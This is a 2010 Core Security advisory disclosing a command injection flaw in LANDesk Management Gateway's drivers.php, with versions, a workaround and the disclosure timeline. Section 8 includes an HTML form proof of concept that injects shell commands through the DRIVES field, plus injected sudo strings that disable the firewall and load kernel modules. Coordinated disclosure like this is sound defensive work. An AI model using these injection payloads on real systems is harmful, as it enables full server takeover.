@@ -1,0 +1,116 @@
+1. Advisory Information
+Title: Landesk OS command injection
+Advisory Id: CORE-2010-1018
+Advisory URL: http://www.coresecurity.com/content/landesk-os-command-injection-vulnerability
+Date published: 2010-11-10
+Date of last update: 2010-11-10
+Vendors contacted: LANDesk
+Release mode: Coordinated release
+
+2. Vulnerability Information
+Class: OS command injection [CWE-78]
+Impact: Code execution
+Remotely Exploitable: Yes (client-side)
+Locally Exploitable: No
+CVE Name: CVE-2010-2892
+Bugtraq ID: N/A
+
+3. Vulnerability Description
+The LANDesk division of Avocent Corporation [1] provides systems management, security management,
+service desk, asset management, and process management solutions to organizations. The company's
+software is used worldwide.
+
+A security vulnerability was discovered in LANDesk Management Suite: The Landesk web application
+does not sufficiently verify if a well-formed request was provided by the user who submitted the
+request. Using this information an external remote attacker can run arbitrary code using the
+gsbadmin user (that is the user running the web-server).
+
+In order to be able to successfully make the attack, the administrator must be logged in to the
+appliance with the browser that the attacker uses to make the attack (for instance, exploiting a
+XSS in a different tab in the browser).
+
+4. Vulnerable Packages
+LANDesk Management Gateway 4.0 GSBWEB v1.61s
+LANDesk Management Gateway 4.2 GSBWEB v1.61
+Older versions are probably affected too
+
+5. Non-Vulnerable Packages
+LANDesk Management Gateway 4.0 GSBWEB v1.62
+LANDesk Management Gateway 4.2 GSBWEB v1.62
+
+6. Vendor Information, Solutions And Workarounds
+Workaround for non-patched versions:
+
+Launch a SSH console session, or log onto the LDMG console and start a terminal session.
+Issue the following command: mv /usr/LANDesk/broker/webroot/gsb/drivers.php ~
+For additional information about this issue, check the LANDesk public announcement
+http://community.landesk.com/support/docs/DOC-21767.
+
+7. Credits
+This vulnerability was discovered and researched by Aureliano Calvo from Core Security Technologies.
+
+8. Technical Description / Proof Of Concept Code
+The Landesk web application does not sufficiently verify if a well-formed request was provided
+by the user who submitted the request.
+
+Using this information an external remote attacker can run arbitrary code using the gsbadmin user
+(that is the user running the web-server), but the gsbadmin user has sudo privileges. Looking at
+/etc/sudoers, you can see that the attacker can also take down the firewall (injecting: ; sudo
+/subin/firewall stop into DRIVES) and load arbitrary kernel modules (injecting ; sudo
+/subin/modprobe /tmp/a_module), effectively taking complete control of the server.
+
+In order to be able to successfully make the attack, the administrator must be logged in to the 
+ppliance with the browser that the attacker uses to make the attack (for instance, exploiting a
+XSS in a different tab in the browser).
+
+8.1. PROOF OF CONCEPT
+
+This PoC is an HTML form (that can be hosted on any web site) that makes a request to the
+[server]. The parameter DRIVES contains the actual injection. In the example, we generate the
+file /tmp/ATTACKED to show that arbitrary shell commands can be executed in the server.
+
+<head><title>LANDesk PoC</title></head>
+  <body>
+    <form method="post" action="https://[server]/gsb/drivers.php">
+      <input type="text" name="DRIVES" value="; touch /tmp/ATTACKED">
+      <input type="text" name="SECONDTIME" value="1">
+      <input type="text" name="ACTION" value="getupdate">
+      <input type="submit" value="Attack!">
+    </form>
+  </body>
+</html>
+
+
+9. Report Timeline
+2010-10-18: Core Security Technologies notifies the LANDesk team of the vulnerability, setting the estimated publication date of the advisory to November 9th 2010.
+2010-10-19: The LANDesk team acknowledges Core Security Technologies' e-mail and asks for a technical description of the vulnerability.
+2010-10-19: Core sends an advisory draft.
+2010-10-21: The LANDesk team notifies they are reviewing the issue and will contact Core in few days.
+2010-10-22: The LANDesk team notifies they have verified the vulnerability and have identified the cause. LANDesk is working on a possible fix and will send an update once the testing of this fix is completed.
+2010-11-02: Core acknowledges LANDesk's e-mail.
+2010-11-08: LANDesk team notifies that they are testing a patch, and they will probably ready to release a fixed version tomorrow, Tuesday 9th.
+2010-11-08: Core acknowledges LANDesk's e-mail and asks the version numbers of both patched and vulnerable versions.
+2010-11-08: LANDesk team notifies the version numbers of the affected and patched versions, and also sends the workaround mentioned in the [Sec. 6].
+2010-11-08: LANDesk team requests to postpone the advisory publication for 24hs given that they are unable to be ready by that time.
+2010-11-09: Core re-schedules the advisory publication to November 10th.
+2010-11-10: The advisory CORE-2010-1018 is published.
+
+10. References
+[1] LANDesk website http://www.landesk.com/. 
+
+11. About CoreLabs
+CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+
+12. About Core Security Technologies
+Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks.
+The company's flagship product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user
+vulnerabilities and identifies what resources are exposed. It enables organizations to determine
+if current security investments are detecting and preventing attacks. Core Security Technologies
+ augments its leading technology solution with world-class security consulting services,
+including penetration testing and software security auditing. Based in Boston, MA and Buenos
+Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at
+http://www.coresecurity.com.
+
+13. Disclaimer
+The contents of this advisory are copyright (c) 2010 Core Security Technologies and (c) 2010 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
